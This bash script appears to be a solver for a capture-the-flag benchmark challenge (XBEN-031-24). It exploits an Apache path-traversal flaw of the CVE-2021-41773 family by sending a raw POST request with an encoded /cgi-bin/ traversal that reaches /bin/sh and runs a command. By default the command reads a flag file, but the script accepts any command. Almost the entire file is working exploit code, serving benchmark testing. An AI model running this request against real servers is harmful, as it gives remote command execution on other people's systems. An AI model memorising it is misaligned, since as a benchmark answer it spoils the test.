#!/usr/bin/env bash
# XBEN-031-24 — Apache path-traversal to CGI RCE (CVE-2021-41773 family).
# Proxy-mode twin. An encoded traversal in /cgi-bin/ reaches /bin/sh; the body
# is a shell script printing the flag. Sent byte-for-byte with --raw-request.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
CMD="${2:-echo Content-Type: text/plain; echo; cat /tmp/flag}"
HOST="${URL#http://}"; HOST="${HOST#https://}"
SESSION="xben031p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
req="$(mktemp)"
LEN=$(printf '%s\n' "$CMD" | wc -c)
printf 'POST /cgi-bin/.%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/bin/sh HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s\n' "$HOST" "$LEN" "$CMD" > "$req"
"$H5I" websec replay "$BASE" --session "$SESSION" --raw-request "$req" >/dev/null
rm -f "$req"
print_flag
